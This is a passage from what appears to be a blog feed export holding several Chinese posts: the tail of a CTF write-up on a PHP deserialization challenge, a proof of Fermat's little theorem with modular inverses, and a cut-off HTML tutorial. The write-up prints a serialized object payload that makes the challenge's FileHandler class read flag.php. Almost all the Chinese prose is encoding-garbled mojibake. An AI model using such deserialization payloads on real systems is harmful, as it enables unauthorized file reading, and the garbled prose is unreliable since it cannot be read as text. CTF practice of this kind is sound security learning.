class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//highlight_file(__FILE__);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;op = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> serialize(<span class="keyword">$this</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//echo(serialize($this));</span></span><br><span class="line">        <span class="comment">//if($this-&gt;op === &quot;2&quot;)</span></span><br><span class="line">        <span class="comment">//    $this-&gt;op = &quot;1&quot;;</span></span><br><span class="line">        <span class="comment">//$this-&gt;content = &quot;&quot;;</span></span><br><span class="line">        <span class="comment">//$this-&gt;process();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="comment">//$res=&#x27;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;r&quot;;&#125;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="/2022/04/28/wdb2020AreUSerialz/1.png" alt="1"></p><p>é‚£ä¹ˆè¿™ä¸ª <code>payload</code> ç›´æ¥æ‰“è¿›å»å°±å¯ä»¥å†æµè§ˆå™¨æºä»£ç æ¨¡å¼çœ‹åˆ°è¯»å‡ºçš„ <code>flag</code> äº†ã€‚</p><p><img src="/2022/04/28/wdb2020AreUSerialz/2.png" alt="2"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;åšåˆ°ä¸€é“é¢˜ï¼Œå†™ä¸‹ &lt;code&gt;write up&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="web" scheme="http://example.com/categories/ctf/web/"/>
    
    <category term="phpååºåˆ—åŒ–" scheme="http://example.com/categories/ctf/web/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
  </entry>
  
  <entry>
    <title>è´¹é©¬å°å®šç†çš„åº”ç”¨åŠè¯æ˜</title>
    <link href="http://example.com/2022/04/28/femal/"/>
    <id>http://example.com/2022/04/28/femal/</id>
    <published>2022-04-27T16:00:00.000Z</published>
    <updated>2022-04-27T18:25:03.694Z</updated>
    
    <content type="html"><![CDATA[<p>å°å­¦ä¸€æ³¢æ•°è®º</p><span id="more"></span><h2 id="è´¹é©¬å°å®šç†"><a href="#è´¹é©¬å°å®šç†" class="headerlink" title="è´¹é©¬å°å®šç†"></a>è´¹é©¬å°å®šç†</h2><p>è‹¥ $p$ ä¸ºç´ æ•°ï¼Œ$\gcd(a, p) = 1$ï¼Œåˆ™ $a^{p - 1} \equiv 1 \pmod{p}$ã€‚</p><p>å¦ä¸€ä¸ªå½¢å¼ï¼šå¯¹äºä»»æ„æ•´æ•° $a$ï¼Œæœ‰ $a^p \equiv a \pmod{p}$ã€‚</p><h3 id="è¯æ˜"><a href="#è¯æ˜" class="headerlink" title="è¯æ˜"></a>è¯æ˜</h3><p>è®¾ä¸€ä¸ªè´¨æ•°ä¸º $p$ï¼Œæˆ‘ä»¬å–ä¸€ä¸ªä¸ä¸º $p$ å€æ•°çš„æ•° $a$ã€‚</p><p>æ„é€ ä¸€ä¸ªåºåˆ—ï¼š$A={1,2,3\dots,p-1}$ï¼Œè¿™ä¸ªåºåˆ—æœ‰ç€è¿™æ ·ä¸€ä¸ªæ€§è´¨ï¼š</p><p>$$<br>\prod_{i=1}^{n}\space A_i\equiv\prod_{i=1}^{n} (A_i\times a) \pmod p<br>$$</p><p>è¯æ˜ï¼š</p><p>$$<br>\because gcd(A_i,p)=1,gcd(A_i\times a,p)=1<br>$$</p><p>åˆå› ä¸ºæ¯ä¸€ä¸ª $A_i\times a \pmod p$ éƒ½æ˜¯ç‹¬ä¸€æ— äºŒçš„ï¼Œä¸” $A_i\times a \pmod p &lt; p$</p><p>å¾—è¯ï¼ˆæ¯ä¸€ä¸ª $A_i\times a$ éƒ½å¯¹åº”äº†ä¸€ä¸ª $A_i$)</p><p>è®¾ $f=(p-1)!$, åˆ™ $f\equiv a\times A_1\times a\times A_2\times a \times A_3 \dots \times  A_{p-1} \pmod p$</p><p>$$<br>a^{p-1}\times f \equiv f \pmod p \     a^{p-1} \equiv 1 \pmod p<br>$$</p><p>è¯æ¯•ã€‚</p><h2 id="æ¬§æ‹‰å®šç†"><a href="#æ¬§æ‹‰å®šç†" class="headerlink" title="æ¬§æ‹‰å®šç†"></a>æ¬§æ‹‰å®šç†</h2><p>æ¬§æ‹‰å®šç†å®é™…ä¸Šå°±æ˜¯è´¹é©¬å°å®šç†çš„æ¨å¹¿ï¼Œæ¬§æ‹‰å®šç†çš„å†…å®¹å¦‚ä¸‹ã€‚</p><p>è‹¥ $\gcd(a, m) = 1$ï¼Œåˆ™ $a^{\varphi(m)} \equiv 1 \pmod{m}$ã€‚</p><p>è‡³äºè¿™ä¸ªè¯æ˜ä¹ˆï¼Œæœ‰ç‚¹å¤æ‚ï¼Œä¸ç»†è®²äº†ï¼ˆå®åˆ™ä¹Ÿä¸ä¼šï¼‰ã€‚å¯ä»¥è¯´ï¼Œè´¹é©¬å°å®šç†æ’‘èµ·äº†å¾ˆå¤šä¸œè¥¿ï¼Œæ¯”å¦‚æˆ‘ä»¬ç»å¸¸ç®—çš„é€†å…ƒï¼Œæˆ–è€…æ˜¯ç»å…¸éå¯¹ç§°åŠ å¯† <code>RSA</code> éƒ½æœ‰ç”¨åˆ°è´¹é©¬å°å®šç†ã€‚</p><h2 id="é€†å…ƒ"><a href="#é€†å…ƒ" class="headerlink" title="é€†å…ƒ"></a>é€†å…ƒ</h2><p>è¿™ä¸ªæ¦‚å¿µæ˜¯æŠ½è±¡ä»£æ•°é‡Œé¢çš„ï¼Œå®šä¹‰ä»£æ•°ä¸­çš„äºŒå…ƒè¿ç®— <code>*</code> å’Œæœ‰é™é›† <code>G</code> ï¼Œè‹¥ $a*bâˆˆG(aâˆˆG,bâˆˆG)$ åˆ™ï¼Œç¾¤ $&lt;G,*&gt;$ æ˜¯ä¸€ä¸ªå…³ç³»ä»£æ•°ã€‚</p><p>ä»£æ•°ä¸­ï¼Œæœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„æ¦‚å¿µå°±æ˜¯å¹ºå…ƒ ï¼Œå¹ºå…ƒæ˜¯æŒ‡ä¸ä»»æ„æ•°è¿›è¡Œå…³ç³»è¿ç®—ç»“æœéƒ½ç­‰äºé‚£ä¸ªæ•°ï¼Œæ¯”å¦‚åœ¨åŠ æ³•è¿ç®—ä¸­ï¼Œ0å°±æ˜¯å¹ºå…ƒï¼Œå› ä¸º0åŠ ä»»ä½•æ•°éƒ½ç­‰äºä»»ä½•æ•°å˜›ã€‚åœ¨ä¹˜æ³•ä¸­ï¼Œ1å°±æ˜¯å¹ºå…ƒï¼ŒåŒæ ·1ä¹˜ä»»ä½•æ•°ä¹Ÿç­‰äºä»»ä½•æ•°ã€‚è€Œé€†å…ƒå°±æ˜¯è¯´ä¸¤ä¸ªæ•°ç›¸äº’è¿›è¡Œå…³ç³»è¿ç®—ä¹‹åå¾—åˆ°å¹ºå…ƒï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªæ•°å°±äº’ç§°ä¸ºå¯¹æ–¹çš„é€†å…ƒã€‚</p><p>è€Œæˆ‘ä»¬å¹³æ—¶ç®—æ³•ç«èµ›ç ”ç©¶çš„ä»£æ•°ä½“ç³»é€šå¸¸æ˜¯ä¹˜æ³•å–æ¨¡è¿ç®—ï¼Œå®ƒå…¶å®è·Ÿä¹˜æ³•ç±»ä¼¼ï¼Œå°±å¤šä¸ªå–æ¨¡ï¼Œå–æ¨¡ä¹Ÿé™å®šäº†å®ƒé›†åˆçš„æœ‰é™æ€§ã€‚åœ¨ä¹˜æ³•æ¨¡è¿ç®—ä¸­ï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°1æ˜¯å¹ºå…ƒã€‚æ‰€ä»¥è‹¥ $b$ æ˜¯ $a$ åœ¨æ¨¡ $m$ æ„ä¹‰ä¸‹çš„é€†å…ƒï¼Œåˆ™æœ‰ $a\times b \equiv 1 \pmod p$ã€‚è€Œè¿™ä¸ª1æˆ‘ä»¬ç¨å¾®ç”¨ä¸€ä¸‹è´¹é©¬å°å®šç†ï¼ŒæŠŠå®ƒå˜æˆ $a^{p-1}$ï¼Œé‚£ä¹ˆæ•´ä¸ªå¼å­å°±å˜æˆäº† $b\equiv a^{p-2}\ (mod\ p)$ã€‚æˆ‘ä»¬å°±èƒ½å·²çŸ¥å…¶ä¸­ä¸€ä¸ªæ•°ç®—å‡ºå¦ä¸€ä¸ªæ•°çš„é€†å…ƒäº†ï¼Œè‡³äºå¹‚è¿ç®—å¯ä»¥ä½¿ç”¨å¿«é€Ÿå¹‚è§£å†³ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç®—ä¸€ä¸ªæ•°çš„é€†å…ƒçš„å¤æ‚åº¦å°±æ˜¯ $O(log_2p)$ äº†ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å°å­¦ä¸€æ³¢æ•°è®º&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="æ•°è®º" scheme="http://example.com/categories/icpc/%E6%95%B0%E8%AE%BA/"/>
    
    <category term="è´¹é©¬å°å®šç†" scheme="http://example.com/categories/icpc/%E6%95%B0%E8%AE%BA/%E8%B4%B9%E9%A9%AC%E5%B0%8F%E5%AE%9A%E7%90%86/"/>
    
    
  </entry>
  
  <entry>
    <title>htmlè¯­è¨€çš„å­¦ä¹ </title>
    <link href="http://example.com/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-04-23T16:00:10.000Z</published>
    <updated>2022-04-24T16:21:58.400Z</updated>
    
    <content type="html"><![CDATA[<p>æ¥å­¦å­¦ <code>html</code> (è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€)ã€‚</p><p>è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€)æ˜¯ä¸€ç§ç”¨äºåˆ›å»ºç½‘é¡µçš„æ ‡å‡†æ ‡è®°è¯­è¨€ã€‚</p><span id="more"></span><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æƒ³å½»å½»åº•åº•å­¦ä¸€é <code>web</code> å®‰å…¨ï¼Œå…ˆä»æœ€åŸºæœ¬çš„ <code>html</code> å¼€å§‹å§ï¼Œé¦–å…ˆ <code>html</code> æ˜¯ç»™æµè§ˆå™¨æ‰§è¡Œçš„è¯­è¨€ï¼Œä¹Ÿå°±æ˜¯è¯´ <code>html</code> æ˜¯åœ¨æˆ‘ä»¬æœ¬åœ°çš„ï¼Œæ˜¯å‰ç«¯è¯­è¨€ï¼Œç›¸å <code>php</code> å°±æ˜¯åç«¯è¯­è¨€äº†ï¼Œåœ¨æœåŠ¡å™¨æ‰§è¡Œå®Œå¾—åˆ°ç»“æœä¹‹åä»¥ <code>html</code> çš„å½¢å¼è¿”å›ç»™ç”¨æˆ·ï¼Œå…ˆæœ€åŸºæœ¬äº†è§£ä¸€ä¸‹ <code>html</code> æœ‰ä¸€ä¸ªæ¸…æ™°çš„æ¦‚å¿µã€‚</p><h2 id="htmlè¯­æ³•"><a href="#htmlè¯­æ³•" class="headerlink" title="htmlè¯­æ³•"></a>htmlè¯­æ³•</h2><p><code>html</code> è¯­æ³•è¾ƒä¸ºæ¾æ•£ï¼Œä»¥è‡³äºä½ åŸºæœ¬è§ä¸åˆ°å› ä¸º <code>html</code> æŠ¥çš„é”™ï¼ˆè¿™ä¹Ÿå°±æ›´åŠ è€ƒéªŒäº†æˆ‘ä»¬çš„ä»£ç åŠŸåº•ï¼Œå› ä¸ºå†™é”™äº†æŸäº›ä¸œè¥¿å®ƒä¸ä¼šæŠ¥é”™çš„ï¼‰ã€‚<code>html</code> è¯´åˆ°åº•å®ƒå°±æ˜¯ç”±æ ‡ç­¾(æœ‰æ—¶å€™ä¹Ÿæˆä¸ºâ€å…ƒç´ â€)å’Œå¯¹åº”çš„å±æ€§ç»„æˆçš„ï¼Œä¸‡ç§è¯­è¨€éƒ½æœ‰è‡ªå·±çš„ <code>hello world</code>ï¼ŒåŒæ ·æˆ‘ä»¬ä¹Ÿå…ˆå†™ä¸€ä¸ª <code>hello world</code>ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            hello world!</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æŠŠå®ƒæ”¾åˆ°æˆ‘ä»¬æ­å»ºçš„ç½‘ç«™çš„æ ¹ç›®å½•ï¼Œç”¨æµè§ˆå™¨è®¿é—® <code>127.0.0.1</code> çœ‹çœ‹ï¼Œè¯·æ³¨æ„ï¼Œå†™å¥½çš„ <code>html</code> æ–‡ä»¶ä¸è¦ç›´æ¥æ‰“å¼€ï¼Œå…»æˆå¥½ä¹ æƒ¯ï¼Œä½¿ç”¨<code>http</code> åè®®è®¿é—®å®ƒï¼Œç”¨ <code>file</code> åè®®è™½ç„¶èƒ½è®¿é—®åˆ°ï¼Œä½†æ˜¯å½“éœ€è¦æ‰§è¡Œ <code>php</code> è„šæœ¬çš„æ—¶å€™ä¼šå‡ºç°å¾ˆå¤šéº»çƒ¦ã€‚</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/1.png" alt="1"></p><h3 id="æ ‡ç­¾"><a href="#æ ‡ç­¾" class="headerlink" title="æ ‡ç­¾"></a>æ ‡ç­¾</h3><p>é‚£ä¹ˆæˆ‘ä»¬æ¥ç»†ç»†è®²è®²æ ‡ç­¾ã€‚</p><p>æ ‡ç­¾å°±æ˜¯ç”±ä¸€å¯¹å°–æ‹¬å· <code>&lt;&gt;</code>ç»„æˆçš„ï¼Œæ ‡ç­¾çš„åŸºæœ¬å½¢å¼å°±æ˜¯ <code>&lt;æ ‡ç­¾å&gt;xxx&lt;/æ ‡ç­¾å&gt;</code>ï¼Œå¯ä»¥åµŒå¥—å…¶å®ƒæ ‡ç­¾ã€‚</p><p>å½“ç„¶ä¹Ÿæœ‰å•èº«ç‹—æ ‡ç­¾æ˜¯è‡ªå·±ä¸€ä¸ªäººå½“ä¸€ä¸ªæ ‡ç­¾ï¼Œå½¢å¦‚<code>&lt;æ ‡ç­¾å/&gt;</code> ï¼Œä¸èƒ½åµŒå¥—å…¶å®ƒæ ‡ç­¾ã€‚</p><p>æ ‡ç­¾å¯ä»¥ç›¸äº’åµŒå¥—ï¼Œåœ¨ä¸Šé¢è¿™ä¸ªä¾‹å­ä¸­ï¼Œä¸éš¾å‘ç° <code>html</code> æ ‡ç­¾å†…åŒ…å« <code>body</code> æ ‡ç­¾ï¼Œ<code>body</code> æ ‡ç­¾åŒ…å« <code>div</code> æ ‡ç­¾ã€‚æˆ‘ä»¬è¿˜å¯ä»¥å‘ç°ï¼Œæ ‡ç­¾ä¸ä¼šç›´æ¥æ˜¾ç¤ºåœ¨ç½‘é¡µä¸­ï¼Œä½†æ˜¯æˆ‘ä»¬èƒ½ä» <code>F12</code> çš„æ§åˆ¶å°ä¸­çœ‹è§æˆ‘ä»¬å†™çš„ <code>html</code> ä»£ç ã€‚</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/2.png" alt="2"></p><p>æ ‡ç­¾å¯ä»¥åµŒå¥—æ–‡å­—ï¼Œè¿™äº›æ–‡å­—ä¼šä¾é™„æ ‡ç­¾ï¼Œå¹¶æ ¹æ®æ ‡ç­¾çš„ç‰¹æ€§æ˜¾ç¤ºæ–‡å­—ã€‚</p><h3 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h3><p>å±æ€§ä¼šå†™åœ¨å¼€å§‹æ ‡ç­¾çš„å°–æ‹¬å·å†…ï¼Œä¸€èˆ¬å½¢å¼ä¸º <code>&lt;æ ‡ç­¾å å±æ€§å1=å±æ€§å€¼1 å±æ€§å2=å±æ€§å€¼2 ...&gt;</code>ã€‚æ¯”å¦‚ç°åœ¨æƒ³ç©ç‚¹èŠ±çš„ï¼Œæˆ‘ä¸æƒ³æ˜¾ç¤ºæ™®é€šçš„ <code>hello world</code> ï¼Œæˆ‘æƒ³æ¢ä¸ªé¢œè‰²ï¼Œæ¯”å¦‚çº¢è‰²ï¼Œæˆ‘æ¢æˆå¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span>&gt;</span></span><br><span class="line">            hello world!</span><br><span class="line">        <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å› ä¸º <code>div</code> æ ‡ç­¾ä¸æ”¯æŒ <code>color</code> å±æ€§ï¼Œå› æ­¤è¿™é‡Œæ¢æˆ <code>font</code> æ ‡ç­¾ï¼Œå¯ä»¥çœ‹åˆ°è¾¾åˆ°äº†æˆ‘ä»¬é¢„æœŸçš„æ•ˆæœã€‚</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/3.png" alt="3"></p><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­çš„ <code>font</code> æ ‡ç­¾æˆ‘ä»¬å°±ä¸ºä»–æŒ‡å®šäº†å±æ€§ï¼Œå±æ€§åä¸º <code>color</code>ï¼Œå¯¹åº”çš„å€¼ä¸º <code>&quot;red&quot;</code> ï¼Œè¡¨ç¤ºäº†è¿™ä¸ªæ ‡ç­¾çš„å†…å®¹å°†æ˜¾ç¤ºçº¢è‰²å­—ä½“ã€‚</p><h3 id="å¸¸ç”¨æ ‡ç­¾"><a href="#å¸¸ç”¨æ ‡ç­¾" class="headerlink" title="å¸¸ç”¨æ ‡ç­¾"></a>å¸¸ç”¨æ ‡ç­¾</h3><ul><li><code>div</code>ï¼šä½œä¸ºå¸ƒå±€å®¹å™¨</li><li><code>a</code>æ ‡ç­¾ï¼šç”¨ä½œç‚¹å‡»è·³è½¬</li><li><code>img</code>ï¼šæ˜¾ç¤ºå›¾ç‰‡ï¼Œå•ä¸ªå‡ºç°</li><li><code>table,tr,td</code>ï¼šè¡¨æ ¼</li><li><code>ul,ol</code>ï¼šåˆ—è¡¨</li><li><code>h1-h6</code>ï¼š1-6çº§æ ‡é¢˜</li><li><code>br</code>ï¼šæ¢è¡Œ</li><li><code>input</code>ï¼šè¡¨å•ç±»</li></ul><h4 id="div"><a href="#div" class="headerlink" title="div"></a>div</h4><p>è¿™ä¸ªæš‚æ—¶å…ˆä¸è®²ï¼Œåº”è¯¥ç­‰åˆ°åé¢è®²å¸ƒå±€çš„æ—¶å€™ä¼šè¯´åˆ°</p><h4 id="a"><a href="#a" class="headerlink" title="a"></a>a</h4><p>ç½‘é¡µè·³è½¬æ˜¯æˆ‘ä»¬æ¯”è¾ƒç†ŸçŸ¥çš„åŠŸèƒ½äº†ï¼Œæ¯”å¦‚æˆ‘ <code>google</code> æœå‡ºæ¥å¾ˆå¤šç»“æœï¼Œç»“æœä¸å¯èƒ½æ˜¾ç¤ºæ•´ä¸ªé¡µé¢ï¼Œå®ƒä¼šç»™å‡ºä¸€ä¸ªæ ‡é¢˜ï¼Œç„¶åè®¾ç½®è¶…é“¾æ¥è·³è½¬åˆ°è¿™ä¸ªé¡µé¢ï¼Œ<code>a</code> æ ‡ç­¾å°±æ˜¯ä¸“é—¨ç”¨æ¥åšè·³è½¬çš„ï¼Œæ ‡ç­¾åŒ…æ‹¬çš„å†…å®¹å°†å…¨éƒ¨ä¼šè¢«è®¾ä¸Šè¶…é“¾æ¥è·³è½¬åˆ° <code>href</code> å±æ€§æŒ‡å®šçš„é“¾æ¥åœ°å€ã€‚å¦‚æœè·³è½¬åˆ°æœ¬ç«™çš„æŸä¸ªé¡µé¢ï¼Œç›´æ¥ä»ç½‘ç«™æ ¹ç›®å½•å¼€å§‹æŒ‡å®šè·¯å¾„å³å¯ï¼Œå¦‚æœè·³è½¬åˆ°å¤–ç«™çš„è¯åˆ™éœ€è¦ä» <code>http://</code> å¼€å§‹ä¹¦å†™è¶…é“¾æ¥ã€‚</p><h5 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://xia0ji233.pro/&quot;</span>&gt;</span></span><br><span class="line">                è¿™æ˜¯ä¸€ä¸ªè¶…é“¾æ¥</span><br><span class="line">            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹çœ‹æ•ˆæœï¼š</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/4.png" alt="4"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œé¼ æ ‡æ‚¬åœåœ¨æ–‡æœ¬çš„æ—¶å€™ä¼šæ˜¾ç¤ºè¶…é“¾æ¥é“¾æ¥çš„åœ°å€ï¼Œç‚¹å‡»å¯ä»¥è·³è½¬åˆ°å¯¹åº”çš„é¡µé¢ã€‚</p><h4 id="img"><a href="#img" class="headerlink" title="img"></a>img</h4><p>æ˜¾ç¤ºå›¾ç‰‡çš„æ ‡ç­¾ï¼Œå•ä¸ªå‡ºç°ï¼Œç”± <code>src</code> å±æ€§æŒ‡å®šå›¾ç‰‡è·¯å¾„ï¼Œå¦‚æœå›¾ç‰‡åœ¨æœ¬ç«™åˆ™å¯ä»¥ç›´æ¥ä»æ ¹ç›®å½•æŒ‡å®šè·¯å¾„ï¼Œå¼•ç”¨ç«™å¤–å›¾ç‰‡åˆ™éœ€è¦ä¹¦å†™å›¾ç‰‡å®Œæ•´çš„è¶…é“¾æ¥ã€‚</p><h5 id="demo-1"><a href="#demo-1" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/1.jpg&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆåŠŸå¼•ç”¨å›¾ç‰‡</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/5.png" 